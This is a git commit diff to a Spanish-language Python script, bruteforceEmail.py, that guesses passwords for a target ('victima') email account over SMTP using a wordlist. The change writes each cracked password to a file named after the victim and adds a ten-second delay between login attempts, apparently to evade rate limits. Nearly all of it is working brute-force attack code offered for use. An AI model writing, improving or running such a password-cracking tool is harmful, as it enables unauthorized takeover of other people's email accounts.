0b5096c4e75c579528afdaecd274c9ebc8b8ad75
ANONDOOR <67384556+ANONDOOR@users.noreply.github.com>
2020-07-29 11:05:33 -0500

    Add files via upload

--- source/bruteforceEmail.py
+++ source/bruteforceEmail.py
@@ -1,5 +1,6 @@
 import smtplib
 import os
+import time
 from colorama import Fore
 
 
@@ -22,10 +23,17 @@ def brute():
         print()
         try:         
             smtp.login(victima, passwords)
-            print(Fore.RESET + str(a) + "/" + str(len(leer_lineas)) + Fore.GREEN + " Contraseña Encontrada ---> {0}".format(str(passwords)) + Fore.RESET)     
+            guardar = print(Fore.RESET + str(a) + "/" + str(len(leer_lineas)) + Fore.GREEN + " Contraseña Encontrada ---> {0}".format(str(passwords)) + Fore.RESET)
+            txt  = open("Contraseña Encontrada para {0}".format(str(victima)),"w")
+            txt.write(str(passwords))
+            time.sleep(10)
         except smtplib.SMTPAuthenticationError as e :
             error = str(e)
             if error[14] == '<':
                 print(Fore.RESET + str(a) + "/" + str(len(leer_lineas)) + Fore.GREEN + " Contraseña Encontrada ---> {0}".format(str(passwords)) + Fore.RESET)
+                txt  = open("Contraseña Encontrada para {0}".format(str(victima)),"w")
+                txt.write(str(passwords))
+                time.sleep(10)            
             else:
                 print(Fore.YELLOW + str(a) + "/" + str(len(leer_lineas)) + Fore.RED + " Contraseña Incorrecta ---> {0}".format(str(passwords)) + Fore.RESET)
+                time.sleep(10) 
